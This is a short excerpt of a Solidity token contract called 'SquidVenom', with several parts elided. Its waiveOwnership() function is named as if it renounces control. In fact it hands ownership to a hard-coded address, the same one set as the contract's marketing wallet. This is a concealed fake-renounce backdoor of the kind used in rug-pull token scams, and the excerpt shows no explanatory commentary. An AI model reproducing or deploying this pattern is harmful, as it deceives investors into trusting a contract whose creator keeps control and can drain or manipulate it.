...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x8e6698aB3Cb3Baa0E0e0886b650549906576AB3d));
        _owner = address(0x8e6698aB3Cb3Baa0E0e0886b650549906576AB3d);
    }
...
contract SquidVenom is Context, IERC20, Ownable {
    ...
    string private _symbol ="Squid V";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x8e6698aB3Cb3Baa0E0e0886b650549906576AB3d);
    address payable public teamWalletAddress = payable(0xe826B02Fa103dd1fa044c70E7717C2f825b5D7f3);
